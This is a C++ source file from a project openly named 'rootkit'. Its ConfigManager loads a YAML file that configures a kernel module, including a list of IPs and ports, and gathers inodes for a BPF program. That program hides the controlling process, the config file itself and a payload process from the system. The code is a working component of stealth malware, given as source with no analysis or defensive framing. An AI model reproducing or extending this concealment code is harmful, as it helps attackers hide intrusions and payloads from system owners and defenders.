#include "rootkit/ConfigManager.hpp"
#include "rootkit/Utils.hpp"

#include <cstdint>
#include <optional>
#include <stdint.h>
#include <unistd.h>
#include <yaml-cpp/exceptions.h>
#include <iostream>

using namespace rootkit;

ConfigManager::ConfigManager(const pid_t payload_pid)
    :rootkit::ConfigManager(CONFIG_PATH, payload_pid)
{}

ConfigManager::ConfigManager(const std::string& config_path, const pid_t payload_pid)
    :config_path(config_path), payload_pid(payload_pid),
    is_config_ready(false)
{
}

bool ConfigManager::read() {
    try {
        YAML::Node config = YAML::LoadFile(config_path);
        // Configure Kernel module
        kConf.module_path = config["kernel_module_config"]["path"].as<std::string>();
        kConf.module_name = config["kernel_module_config"]["name"].as<std::string>();

        // Get all IPs and ports
        for (const auto& ip_and_port : config["kernel_module_config"]["ips_and_ports"]) {
            const std::string ip = ip_and_port["ip"].as<std::string>();
            const uint16_t port = ip_and_port["port"].as<uint16_t>();
            kConf.ips_and_ports.push_back({ip, port});
        }

        // Configure bpf program
        // If true, get inode of /proc/<self>
        if (config["bpf_program_config"]["hide_host"].as<bool>()) {
            auto inode_opt = utils::get_inode_of_process(getppid());
            if (inode_opt.has_value())
                bpfConf.inodes.push_back(inode_opt.value());
        }

        // If true, get inode of <config_path>
        if (config["bpf_program_config"]["hide_config"].as<bool>()) {
            auto inode_opt = utils::get_inode_of_file(config_path);
            if (inode_opt.has_value())
                bpfConf.inodes.push_back(inode_opt.value());
        }

        // If true, get inode of /proc/<payload>
        if (config["bpf_program_config"]["hide_payload"].as<bool>()
            && payload_pid != 0) {

            auto inode_opt = utils::get_inode_of_process(payload_pid);
            if (inode_opt.has_value())
                bpfConf.inodes.push_back(inode_opt.value());
        }

        // Get all additional inodes
        for (const auto& inode : config["bpf_program_config"]["inodes"])
            bpfConf.inodes.push_back(inode.as<uint64_t>());

    } catch (YAML::Exception e) {
        std::cerr << "Error parsing YAML: " << e.what() << std::endl;
        return false;
    }

    this->is_config_ready = true;
    return true;
}

std::optional<KernelModuleConfig> ConfigManager::get_kernel_module_config() {
    if (is_config_ready)
        return kConf;
    return std::nullopt;
}

std::optional<RootkitBpfConfig> ConfigManager::get_bpf_config() {
    if (is_config_ready)
        return bpfConf;
    return std::nullopt;
}
